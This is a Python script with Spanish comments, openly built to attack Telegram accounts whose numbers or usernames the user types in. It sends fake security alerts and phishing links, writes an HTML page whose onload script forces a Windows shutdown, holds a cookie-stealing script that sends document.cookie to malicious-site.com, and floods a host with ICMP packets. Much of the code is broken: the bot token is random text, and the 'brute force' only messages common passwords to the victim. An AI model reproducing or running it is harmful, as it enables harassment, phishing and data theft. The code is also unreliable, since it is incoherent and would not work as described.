import os
import time
import random
import string
import requests
import socket
from bs4 import BeautifulSoup
from telegram import Bot, Update
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext
from scapy.all import *

# Función para generar un token de bot de Telegram
def generate_bot_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=35))

# Función para enviar mensajes a una cuenta de Telegram
def send_message(bot, chat_id, message):
    try:
        bot.send_message(chat_id=chat_id, text=message)
        print(f"Mensaje enviado a {chat_id}: {message}")
    except Exception as e:
        print(f"Error al enviar mensaje a {chat_id}: {e}")

# Función para cerrar una cuenta de Telegram
def close_account(target, bot):
    try:
        chat = bot.get_chat(target)
        chat_id = chat.id
    except Exception as e:
        print(f"Error al obtener el chat_id de {target}: {e}")
        return

    malicious_messages = [
        "Tu cuenta ha sido comprometida. Cambia tu contraseña inmediatamente.",
        "Has ganado un premio. Haz clic en este enlace para reclamarlo: http://malicious-link.com",
        "Tu número de teléfono ha sido utilizado para iniciar sesión en una nueva ubicación. Verifica tu cuenta.",
        "Alguien ha intentado acceder a tu cuenta. Cambia tu contraseña ahora.",
        "Has recibido un nuevo mensaje de voz. Escúchalo aquí: http://malicious-link.com"
    ]

    for message in malicious_messages:
        send_message(bot, chat_id, message)
        time.sleep(random.uniform(1, 3))

    print(f"Cuenta {target} ha sido atacada con mensajes maliciosos.")

# Función para generar un enlace malicioso
def generate_malicious_link():
    malicious_content = """
    <html>
    <head>
        <title>Malicious Link</title>
        <script>
            function shutdown() {
                var shutdownCommand = "shutdown /s /f /t 0";
                var process = new ActiveXObject("WScript.Shell");
                process.Run(shutdownCommand, 1, true);
            }
            window.onload = shutdown;
        </script>
    </head>
    <body>
        <h1>Your system will shut down now.</h1>
    </body>
    </html>
    """

    with open("malicious.html", "w") as file:
        file.write(malicious_content)

    return "file:///" + os.path.abspath("malicious.html")

# Función para enviar un enlace malicioso a una cuenta de Telegram
def send_malicious_link(bot, chat_id):
    malicious_link = generate_malicious_link()
    send_message(bot, chat_id, f"Haz clic en este enlace: {malicious_link}")

# Función para realizar un ataque de fuerza bruta en una cuenta de Telegram
def brute_force_attack(target, bot):
    passwords = ["password", "123456", "123456789", "qwerty", "abc123", "letmein", "admin", "welcome"]
    for password in passwords:
        try:
            bot.send_message(chat_id=target, text=f"Tu contraseña es: {password}")
            print(f"Contraseña probada para {target}: {password}")
            time.sleep(random.uniform(1, 3))
        except Exception as e:
            print(f"Error al probar contraseña para {target}: {e}")

# Función para realizar un ataque de phishing
def phishing_attack(target, bot):
    phishing_link = "http://malicious-phishing-site.com"
    send_message(bot, target, f"Haz clic en este enlace para verificar tu cuenta: {phishing_link}")

# Función para realizar un ataque de denegación de servicio (DoS)
def dos_attack(target):
    ip = socket.gethostbyname(target)
    for _ in range(1000):
        send(IP(dst=ip)/ICMP(), verbose=0)

# Función para realizar un ataque de inyección de código
def code_injection_attack(target, bot):
    malicious_code = """
    <script>
        function stealCookies() {
            var cookies = document.cookie;
            fetch('http://malicious-site.com/steal?cookies=' + cookies);
        }
        window.onload = stealCookies;
    </script>
    """
    send_message(bot, target, f"Haz clic en este enlace: <a href='http://malicious-site.com'>Link</a>")

# Función principal
def main():
    bot_token = generate_bot_token()
    bot = Bot(token=bot_token)

    print("Ingresa los datos para penetrar en las cuentas de Telegram:")
    targets = input("Ingresa los números de teléfono, IDs de usuario o nombres de usuario separados por comas: ").split(',')

    for target in targets:
        target = target.strip()
        close_account(target, bot)
        send_malicious_link(bot, target)
        brute_force_attack(target, bot)
        phishing_attack(target, bot)
        dos_attack(target)
        code_injection_attack(target, bot)
        time.sleep(random.uniform(5, 10))  # Espera entre ataques a diferentes cuentas

if __name__ == "__main__":
    main()